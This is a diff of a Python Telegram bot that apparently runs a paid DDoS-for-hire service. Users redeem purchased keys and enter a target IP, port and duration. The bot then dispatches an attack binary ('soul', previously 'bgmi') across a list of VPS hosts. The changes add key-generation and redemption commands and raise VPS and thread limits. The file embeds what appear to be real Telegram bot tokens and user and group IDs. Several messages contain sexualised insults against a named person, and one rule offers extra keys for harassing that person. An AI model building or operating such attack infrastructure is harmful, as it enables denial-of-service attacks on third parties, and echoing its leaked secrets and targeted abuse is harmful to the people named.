@@ -2,6 +2,7 @@
 import os
 import time
 import logging
+from telegram.constants import ParseMode
 import asyncio
 import random
 import json
@@ -17,6 +18,16 @@ import sys
 import subprocess
 import threading
 from pathlib import Path
+import re
+
+def escape_markdown(text: str, version: int = 1) -> str:
+    if version == 2:
+        escape_chars = r'\_*[]()~`>#+-=|{}.!'
+    else:
+        escape_chars = r'\_*[]()'
+    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)
+
+
 
 # Suppress HTTP request logs
 logging.getLogger("httpx").setLevel(logging.WARNING)
@@ -34,19 +45,20 @@ BOT_CONFIG_FILE = "bot_configs.json"
 BOT_DATA_DIR = "bot_data"  # Directory to store each bot's data
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7811371593:AAEgO1hwifgODXfowvHUVHgqd0xzIeX-aD4'
-OWNER_USERNAME = "LASTWISHES0"
+TELEGRAM_BOT_TOKEN = '7052787265:AAHF9957hIRSGZtaENdHZAA_9Cx0iROS9k0'
+OWNER_ID = 6882674372  # 👈 Put your real Telegram user ID here
 CO_OWNERS = []  # List of user IDs for co-owners
 OWNER_CONTACT = "Contact to buy keys"
-ALLOWED_GROUP_IDS = [-1002569945697]
+ALLOWED_GROUP_IDS = [-1002569945697,-1002267337768]
 MAX_THREADS = 1000
 max_duration = 120
 bot_open = False
+OWNER_USERNAME = "LASTWISHES0"
 SPECIAL_MAX_DURATION = 600
 SPECIAL_MAX_THREADS = 2000
 BOT_START_TIME = time.time()
 
-ACTIVE_VPS_COUNT = 6  # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
+ACTIVE_VPS_COUNT = 10000  # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
 # Display Name Configuration
 GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
 DISPLAY_NAME_FILE = "display_names.json"
@@ -57,7 +69,7 @@ LINKS = {}
 
 # VPS Configuration
 VPS_FILE = "vps.txt"
-BINARY_NAME = "bgmi"
+BINARY_NAME = "soul"
 BINARY_PATH = f"/home/master/{BINARY_NAME}"
 VPS_LIST = []
 
@@ -85,7 +97,7 @@ KEY_PRICES = {
 
 # Special Key Prices
 SPECIAL_KEY_PRICES = {
-    "1D": 70,
+    "1D": 70,  
     "2D": 130,  # 30 days special key price
     "3D": 250,  # 30 days special key price
     "4D": 300,  # 30 days special key price
@@ -112,7 +124,7 @@ START_IMAGES = [
             '💻 *Example:* `20.235.43.9 14533 120 100`' + '\n\n'
             '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad*' + '\n\n'
             '⚠️ *🥰🥰🥰🥰🥰🥰🥰🥰🥰🥰🤬*⚠️' + '\n\n'
-            '⚠️ *JOIN CHANNEL @NXTLVLPUBLIC *' + '\n\n'
+            '⚠️ *JOIN CHANNEL  @NXTLVLPUBLIC *' + '\n\n'
         )
     },
     
@@ -183,7 +195,7 @@ owner_keyboard = [
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
 co_owner_keyboard = [
-    ['Sstart', 'Attack', 'Redeem Key'],
+    ['/Start', 'Attack', 'Redeem Key'],
     ['Rules', 'Delete Key', 'Generate Key'],
     ['OpenBot', '🔑 Special Key', 'CloseBot'],
     ['Settings', '⏳ Uptime', 'Menu']
@@ -262,15 +274,20 @@ async def owner_settings(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *Only the owner can access these settings!*", parse_mode='Markdown')
         return
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    # Make sure current_display_name is defined here or before this
+    current_display_name = get_display_name_from_update(update)
+    
+    escaped_display_name = escape_markdown(current_display_name)
     
     await update.message.reply_text(
         f"⚙️ *Owner Settings Menu*\n\n"
         f"Select an option below:\n\n"
-        f"👑 *Bot Owner:* {current_display_name}",
+        f"👑 *Bot Owner:* {escaped_display_name}",
         parse_mode='Markdown',
         reply_markup=owner_settings_markup
     )
+
+
 
 async def set_display_name(update: Update, new_name: str, group_id=None):
     """Updates the display name for specific group or default"""
@@ -441,24 +458,20 @@ async def manage_links(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ Only owner can manage links!", parse_mode='Markdown')
         return
     
-    # Escape Markdown in link URLs before displaying
-    link1 = escape_markdown(LINKS.get('link_1', 'Not set'), version=2)
-    link2 = escape_markdown(LINKS.get('link_2', 'Not set'), version=2)
-    link3 = escape_markdown(LINKS.get('link_3', 'Not set'), version=2)
-    link3 = escape_markdown(LINKS.get('link_4', 'Not set'), version=2)
-    
-    current_links = (
-    "🔗 *Link Management*\n\n"
-    "Current Links:\n"
-    r"1\. Link 1\n"
-    r"2\. Link 2\n"
-    r"3\. Link 3\n"
-    r"4\. Link 4\n\n"
-    "Enter the number (1, 2, 3, or 4) of the link you want to replace:"
+    current_links_text = (
+        "🔗 *Link Management*\n\n"
+        "Current Links:\n"
+        "1. Link 1\n"
+        "2. Link 2\n"
+        "3. Link 3\n"
+        "4. Link 4\n\n"
+        "Enter the number (1, 2, 3, or 4) of the link you want to replace:"
     )
     
+    escaped_text = escape_markdown(current_links_text, version=2)
+    
     await update.message.reply_text(
-        current_links,
+        escaped_text,
         parse_mode='MarkdownV2'
     )
     return GET_LINK_NUMBER
@@ -484,14 +497,12 @@ async def get_link_number(update: Update, context: CallbackContext):
         return ConversationHandler.END
 
 async def get_link_url(update: Update, context: CallbackContext):
-    """Get the new URL for the selected link"""
     if 'editing_link' not in context.user_data:
         return ConversationHandler.END
     
     link_key = context.user_data['editing_link']
     new_url = update.message.text.strip()
     
-    # Basic URL validation
     if not (new_url.startswith('http://') or new_url.startswith('https://')):
         await update.message.reply_text("❌ Invalid URL! Must start with http:// or https://")
         return ConversationHandler.END
@@ -499,15 +510,16 @@ async def get_link_url(update: Update, context: CallbackContext):
     LINKS[link_key] = new_url
     save_links()
     
-    # Escape Markdown characters in the URL and response
-    escaped_url = escape_markdown(new_url, version=2)
     link_num = link_key.split('_')[1]
+    text = f"✅ Link {link_num} updated successfully!\nNew URL: `{new_url}`"
+    
+    escaped_text = escape_markdown(text, version=2)
     
     await update.message.reply_text(
-    f"✅ Link {link_num} updated successfully!\n"
-    f"New URL: `{escaped_url}`",
-    parse_mode='MarkdownV2'
+        escaped_text,
+        parse_mode='MarkdownV2'
     )
+
     
     # Clear the editing state
     context.user_data.pop('editing_link', None)
@@ -661,11 +673,24 @@ def save_keys():
                 file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")
 
         for key, key_info in redeemed_keys_info.items():
-            if key_info['redeemed_by'] in redeemed_users:
+            user_id = key_info['redeemed_by']
+            if user_id in redeemed_users:
+                expiration_info = redeemed_users[user_id]
                 if 'is_special' in key_info and key_info['is_special']:
-                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]['expiration_time']}\n")
+                    # redeemed_users[user_id] can be dict or float; handle both
+                    if isinstance(expiration_info, dict):
+                        expiration_time = expiration_info.get('expiration_time', 0)
+                    else:
+                        expiration_time = expiration_info
+                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{user_id},{expiration_time}\n")
                 else:
-                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")
+                    # normal keys store expiration as float
+                    if isinstance(expiration_info, dict):
+                        expiration_time = expiration_info.get('expiration_time', 0)
+                    else:
+                        expiration_time = expiration_info
+                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{user_id},{expiration_time}\n")
+
 
 def load_bot_configs():
     """Load bot configurations from file"""
@@ -699,7 +724,8 @@ def is_allowed_group(update: Update):
     return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS
 
 def is_owner(update: Update):
-    return update.effective_user.username == OWNER_USERNAME
+    return update.effective_user.id == OWNER_ID
+
 
 def is_co_owner(update: Update):
     return update.effective_user.id in CO_OWNERS
@@ -731,7 +757,7 @@ async def reset_vps(update: Update, context: CallbackContext):
     # Clear all running attacks
     running_attacks.clear()
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"✅ *Reset {busy_count} busy VPS - they are now available for new attacks!*\n\n"
@@ -833,7 +859,7 @@ async def delete_binary_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ Only owner or co-owners can delete binaries!", parse_mode='Markdown')
         return ConversationHandler.END
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚠️ Are you sure you want to delete {BINARY_NAME} from all VPS?\n\n"
@@ -906,7 +932,7 @@ async def delete_binary_confirm(update: Update, context: CallbackContext):
     
     # Send results
     result_text = "\n".join(results)
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await message.edit_text(
         f"🗑️ {BINARY_NAME} Binary Deletion Results:\n\n"
@@ -1139,6 +1165,8 @@ async def stop_selected_bot(update: Update, context: CallbackContext):
     )
     return SELECT_BOT_TO_STOP
 
+
+
 async def stop_bot_selection(update: Update, context: CallbackContext):
     try:
         selection = int(update.message.text)
@@ -1205,6 +1233,73 @@ async def show_bot_list_cmd(update: Update, context: CallbackContext):
         parse_mode='Markdown'
     )
 
+async def manual_key_generation(update: Update, context: CallbackContext):
+    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
+        await update.message.reply_text("❌ You are not allowed to generate keys.")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text("❌ Usage: /code <duration>\nExamples: /code 1h or /code 2d")
+        return
+
+    raw_input = args[0].lower()
+
+    # Determine duration in seconds
+    if raw_input.endswith("h"):
+        try:
+            amount = int(raw_input[:-1])
+            duration_str = f"{amount}H"
+            duration_seconds = amount * 3600
+        except ValueError:
+            await update.message.reply_text("❌ Invalid hour format. Example: /code 2h")
+            return
+    elif raw_input.endswith("d"):
+        try:
+            amount = int(raw_input[:-1])
+            duration_str = f"{amount}D"
+            duration_seconds = amount * 86400
+        except ValueError:
+            await update.message.reply_text("❌ Invalid day format. Example: /code 3d")
+            return
+    else:
+        # Default to days if no suffix is provided
+        try:
+            amount = int(raw_input)
+            duration_str = f"{amount}D"
+            duration_seconds = amount * 86400
+        except ValueError:
+            await update.message.reply_text("❌ Invalid input. Use something like /code 1h or /code 3d")
+            return
+
+    user_id = update.effective_user.id
+    price = KEY_PRICES.get(duration_str)
+
+    if is_reseller(update):
+        if not price:
+            await update.message.reply_text(f"❌ No price configured for {duration_str}")
+            return
+        if user_id not in reseller_balances or reseller_balances[user_id] < price:
+            await update.message.reply_text(f"❌ You need {price} coins to generate this key.")
+            return
+        reseller_balances[user_id] -= price
+
+    unique_key = os.urandom(4).hex().upper()
+    key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"
+
+    keys[key] = {
+        'expiration_time': time.time() + duration_seconds,
+        'generated_by': user_id
+    }
+
+    save_keys()
+
+    await update.message.reply_text(
+        f"✅ Key generated:\n\n🔑 `{key}`\n⏳ Valid for {duration_str}",
+        parse_mode='Markdown'
+    )
+
+
 async def open_bot(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_co_owner(update)):
         await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
@@ -1235,12 +1330,11 @@ async def start(update: Update, context: CallbackContext):
     user = update.effective_user
     image = get_random_start_image()
 
-     # Track this interaction
+    # ✅ Properly indented user tracking
     if 'users_interacted' not in context.bot_data:
         context.bot_data['users_interacted'] = set()
     context.bot_data['users_interacted'].add(user.id)
-    
-    current_display_name = get_display_name(chat.id if chat.type in ['group', 'supergroup'] else None)
+
     
     modified_caption = (
         f"{image['caption']}\n\n"
@@ -1322,7 +1416,7 @@ async def generate_key_duration(update: Update, context: CallbackContext):
 
     save_keys()
 
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"🔑 *Generated Key:* `{key}`\n\n"
@@ -1389,7 +1483,7 @@ async def generate_special_key_format(update: Update, context: CallbackContext):
     
     save_keys()
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"💎 *Special Key Generated!*\n\n"
@@ -1398,7 +1492,7 @@ async def generate_special_key_format(update: Update, context: CallbackContext):
         f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
         f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
         f"👑 *Bot Owner:* PAPA KA BOT\n\n"
-        f"⚠️ *This key provides enhanced attack capabilities*",
+        f"⚠️ *This key provides enhanced attack capabilities when you fucking Raja mommy!*",
         parse_mode='Markdown'
     )
     return ConversationHandler.END
@@ -1428,14 +1522,19 @@ async def redeem_key_input(update: Update, context: CallbackContext):
             'generated_by': keys[key]['generated_by']
         }
         del keys[key]
-        
+
         current_display_name = get_display_name(update.effective_chat.id)
-        
-        await update.message.reply_text(
+
+        text = (
             f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
-            f"👑 *Bot Owner:* {current_display_name}",
-            parse_mode='Markdown'
+            f"👑 *Bot Owner:* {current_display_name}"
         )
+        escaped_text = escape_markdown(text, version=2)
+        await update.message.reply_text(
+            escaped_text,
+            parse_mode='MarkdownV2'
+        )
+
     elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
         user_id = update.effective_user.id
         redeemed_users[user_id] = {
@@ -1448,27 +1547,36 @@ async def redeem_key_input(update: Update, context: CallbackContext):
             'is_special': True
         }
         del special_keys[key]
-        
+
         current_display_name = get_display_name(update.effective_chat.id)
-        
-        await update.message.reply_text(
+
+        text = (
             f"💎 *Special Key Redeemed!*\n\n"
             f"*You now have access to enhanced attacks:*\n"
             f"• Max Duration: {SPECIAL_MAX_DURATION} sec\n"
             f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
             f"👑 *Bot Owner:* {current_display_name}\n\n"
-            f"⚡ *Happy attacking!*",
-            parse_mode='Markdown'
+            f"⚡ *Happy attacking and Raja ki maka chut phaad do!*"
         )
+        escaped_text = escape_markdown(text, version=2)
+        await update.message.reply_text(
+            escaped_text,
+            parse_mode='MarkdownV2'
+        )
+
     else:
         current_display_name = get_display_name(update.effective_chat.id)
-        
-        await update.message.reply_text(
+
+        text = (
             f"❌ *Invalid or expired key!*\n\n"
-            f"🔑 *Buy valid keys from {current_display_name}*",
-            parse_mode='Markdown'
+            f"🔑 *Buy valid keys from {current_display_name}*"
         )
-    
+        escaped_text = escape_markdown(text, version=2)
+        await update.message.reply_text(
+            escaped_text,
+            parse_mode='MarkdownV2'
+        )
+
     save_keys()
     return ConversationHandler.END
 
@@ -1515,7 +1623,7 @@ async def attack_start(update: Update, context: CallbackContext):
         current_display_name = get_display_name(update.effective_chat.id)
         
         await update.message.reply_text(
-            "⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*\n\n"
+            "⚠️ *Enter the attack arguments: <ip> <port> <duration>*\n\n"
             f"ℹ️ *When bot is open, max duration is {max_duration} sec. For {SPECIAL_MAX_DURATION} sec, you need a key.*\n\n"
             f"🔑 *Buy keys from {current_display_name}*",
             parse_mode='Markdown'
@@ -1536,7 +1644,7 @@ async def attack_input(update: Update, context: CallbackContext):
 
     args = update.message.text.split()
     if len(args) != 3:  # Now only 3 arguments (ip, port, duration)
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         await update.message.reply_text(
             f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
             f"👑 *Bot Owner:* {current_display_name}\n"
@@ -1559,7 +1667,7 @@ async def attack_input(update: Update, context: CallbackContext):
             threads = SPECIAL_MAX_THREADS  # Default threads for special key users
     
     if duration > max_duration and not is_special:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         await update.message.reply_text(
             f"❌ *Attack duration exceeds 120 seconds!*\n"
             f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
@@ -1571,7 +1679,7 @@ async def attack_input(update: Update, context: CallbackContext):
     max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
 
     if duration > max_allowed_duration:
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         await update.message.reply_text(
             f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
             f"👑 *Bot Owner:* {current_display_name}",
@@ -1593,7 +1701,7 @@ async def attack_input(update: Update, context: CallbackContext):
     attack_id = f"{ip}:{port}-{time.time()}"
     
     attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     # Send attack started message
     start_message = await update.message.reply_text(
@@ -1670,7 +1778,7 @@ async def attack_input(update: Update, context: CallbackContext):
                              f"🔥 *ATTACK COMPLETED!*",
                         parse_mode='Markdown'
                     ),
-                    context.bot.application.event_loop
+                app_event_loop  # 👈 This must be passed or set globally
                 )
 
     try:
@@ -1708,7 +1816,7 @@ async def set_cooldown_input(update: Update, context: CallbackContext):
 
     try:
         global_cooldown = int(update.message.text)
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             f"✅ *Global cooldown set to {global_cooldown} seconds!*\n\n",
@@ -1784,17 +1892,70 @@ async def show_keys(update: Update, context: CallbackContext):
             else:
                 redeemed_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")
 
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     message = (
         "*🗝️ Active Regular Keys:*\n" + ("\n".join(active_keys) + "\n\n" if active_keys else "No active regular keys found.\n\n") +
         "*💎 Active Special Keys:*\n" + ("\n".join(active_special_keys) + "\n\n" if active_special_keys else "No active special keys found.\n\n") +
         "*🗝️ Redeemed Keys:*\n" + ("\n".join(redeemed_keys) + "\n\n" if redeemed_keys else "No redeemed keys found.\n\n") +
         "*🗝️ Expired Keys:*\n" + ("\n".join(expired_keys) if expired_keys else "No expired keys found.") +
-        f"\n\n👑 *Bot Owner:* APNA BHAI KA BOT"
+        f"\n\n👑 *Bot Owner:* PAPA KA BOT"
     )
 
     await update.message.reply_text(message, parse_mode='Markdown')
+
+
+async def redeem_key_manual(update: Update, context: CallbackContext):
+    if not context.args:
+        await update.message.reply_text("❌ Usage: /redeem <key>")
+        return
+
+    key = context.args[0].strip()
+    user_id = update.effective_user.id
+    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat else None)
+
+    if key in keys and keys[key]['expiration_time'] > time.time():
+        redeemed_users[user_id] = keys[key]['expiration_time']
+        redeemed_keys_info[key] = {
+            'redeemed_by': user_id,
+            'generated_by': keys[key]['generated_by']
+        }
+        del keys[key]
+        save_keys()
+
+        await update.message.reply_text(
+            f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
+            f"👑 *Bot Owner:* {current_display_name}",
+            parse_mode='Markdown'
+        )
+    elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
+        redeemed_users[user_id] = {
+            'expiration_time': special_keys[key]['expiration_time'],
+            'is_special': True
+        }
+        redeemed_keys_info[key] = {
+            'redeemed_by': user_id,
+            'generated_by': special_keys[key]['generated_by'],
+            'is_special': True
+        }
+        del special_keys[key]
+        save_keys()
+
+        await update.message.reply_text(
+            f"💎 *Special Key Redeemed!*\n\n"
+            f"• Max Duration: {SPECIAL_MAX_DURATION} sec\n"
+            f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
+            f"👑 *Bot Owner:* {current_display_name}",
+            parse_mode='Markdown'
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ *Invalid or expired key!*\n\n"
+            f"🔑 *Buy valid keys from {current_display_name}*",
+            parse_mode='Markdown'
+        )
+
+
 
 async def set_duration_start(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_co_owner(update)):
@@ -1835,7 +1996,7 @@ async def set_duration_input(update: Update, context: CallbackContext):
     global max_duration
     try:
         max_duration = int(update.message.text)
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             f"✅ *Maximum attack duration set to {max_duration} seconds!*\n\n",
@@ -1858,7 +2019,7 @@ async def set_threads_input(update: Update, context: CallbackContext):
     global MAX_THREADS
     try:
         MAX_THREADS = int(update.message.text)
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             f"✅ *Maximum threads set to {MAX_THREADS}!*\n\n",
@@ -1915,7 +2076,7 @@ async def add_reseller_input(update: Update, context: CallbackContext):
         user_id = int(user_id_str)
         resellers.add(user_id)
         reseller_balances[user_id] = 0
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*\n\n👑 *Bot Owner:* ", parse_mode='Markdown')
     except ValueError:
@@ -1941,7 +2102,7 @@ async def remove_reseller_input(update: Update, context: CallbackContext):
             resellers.remove(user_id)
             if user_id in reseller_balances:
                 del reseller_balances[user_id]
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*\n\n👑 *Bot Owner:*", parse_mode='Markdown')
         else:
@@ -1986,7 +2147,7 @@ async def add_coin_amount(update: Update, context: CallbackContext):
         user_id = context.user_data['add_coin_user_id']
         if user_id in reseller_balances:
             reseller_balances[user_id] += amount
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*\n\n",
@@ -2007,7 +2168,7 @@ async def balance(update: Update, context: CallbackContext):
 
     user_id = update.effective_user.id
     balance = reseller_balances.get(user_id, 0)
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"💰 *Your current balance is: {balance} coins*\n\n",
@@ -2018,7 +2179,7 @@ async def handle_photo(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id in feedback_waiting:
         del feedback_waiting[user_id]
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             "✅ *Thanks for your feedback!*\n\n",
@@ -2116,7 +2277,7 @@ async def add_vps_info(update: Update, context: CallbackContext):
         VPS_LIST.append([ip, username, password])
         save_vps()
         
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             f"✅ VPS added successfully!\n\n"
@@ -2148,7 +2309,7 @@ async def remove_vps_start(update: Update, context: CallbackContext):
         f"{i+1}. IP: `{vps[0]}`, User: `{vps[1]}`" 
         for i, vps in enumerate(VPS_LIST))
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚠️ Select VPS to remove by number:\n\n{vps_list_text}\n\n",
@@ -2162,7 +2323,7 @@ async def remove_vps_selection(update: Update, context: CallbackContext):
         if 0 <= selection < len(VPS_LIST):
             removed_vps = VPS_LIST.pop(selection)
             save_vps()
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"✅ VPS removed successfully!\n\n"
@@ -2186,7 +2347,7 @@ async def upload_binary_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ No VPS available to upload binary!", parse_mode='Markdown')
         return ConversationHandler.END
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         "⚠️ Please upload the binary file you want to distribute to all VPS.\n\n"
@@ -2208,7 +2369,7 @@ async def upload_binary_confirm(update: Update, context: CallbackContext):
     download_path = f"./{file_name}"
     await file.download_to_drive(download_path)
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     message = await update.message.reply_text(
         f"⏳ Starting {file_name} binary upload to all VPS...\n\n",
@@ -2262,7 +2423,7 @@ async def upload_binary_confirm(update: Update, context: CallbackContext):
     
     # Send results
     result_text = "\n".join(results)
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await message.edit_text(
         f"📤 {file_name} Binary Upload Results:\n\n"
@@ -2383,7 +2544,7 @@ async def show_vps_status(update: Update, context: CallbackContext):
             await update.message.reply_text(full_message, parse_mode='Markdown')
 
 async def rules(update: Update, context: CallbackContext):
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     rules_text = (
         "📜 *Rules:*\n\n"
@@ -2394,6 +2555,7 @@ async def rules(update: Update, context: CallbackContext):
         "5. Respect other users and the bot owner.\n\n"
         "6. Any violation of these rules will result key ban with no refund.\n\n\n"
         "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
+        "JO BHI Raja KI MAKI CHUT PHAADKE SS DEGA USSE EXTRA KEY DUNGA.\n\n"
     )
     await update.message.reply_text(rules_text, parse_mode='Markdown')
 
@@ -2410,7 +2572,7 @@ async def add_group_id_input(update: Update, context: CallbackContext):
         group_id = int(update.message.text)
         if group_id not in ALLOWED_GROUP_IDS:
             ALLOWED_GROUP_IDS.append(group_id)
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"✅ *Group ID {group_id} added successfully!*\n\n"
@@ -2418,7 +2580,7 @@ async def add_group_id_input(update: Update, context: CallbackContext):
                 parse_mode='Markdown'
             )
         else:
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"ℹ️ *Group ID {group_id} is already in the allowed list.*\n\n",
@@ -2435,7 +2597,7 @@ async def remove_group_id_start(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *Only the owner or co-owners can remove group IDs!*", parse_mode='Markdown')
         return ConversationHandler.END
 
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     await update.message.reply_text(
         f"⚠️ *Enter the group ID to remove from allowed list.*\n\n"
@@ -2449,7 +2611,7 @@ async def remove_group_id_input(update: Update, context: CallbackContext):
         group_id = int(update.message.text)
         if group_id in ALLOWED_GROUP_IDS:
             ALLOWED_GROUP_IDS.remove(group_id)
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"✅ *Group ID {group_id} removed successfully!*\n\n"
@@ -2457,7 +2619,7 @@ async def remove_group_id_input(update: Update, context: CallbackContext):
                 parse_mode='Markdown'
             )
         else:
-            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            current_display_name = get_display_name_from_update(update)
             
             await update.message.reply_text(
                 f"❌ *Group ID {group_id} not found in allowed list!*\n\n",
@@ -2474,7 +2636,7 @@ async def show_menu(update: Update, context: CallbackContext):
         await update.message.reply_text("❌ *Only owner or co-owners can access this menu!*", parse_mode='Markdown')
         return
     
-    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+    current_display_name = get_display_name_from_update(update)
     
     if is_owner(update):
         await update.message.reply_text(
@@ -2492,7 +2654,7 @@ async def show_menu(update: Update, context: CallbackContext):
 
 async def back_to_home(update: Update, context: CallbackContext):
     if is_owner(update):
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        current_display_name = get_display_name_from_update(update)
         
         await update.message.reply_text(
             f"🏠 *Returned to main menu*\n\n",
@@ -2500,7 +2662,7 @@ async def back_to_home(update: Update, context: CallbackContext):
             reply_markup=owner_markup
         )
     elif is_co_owner(update):
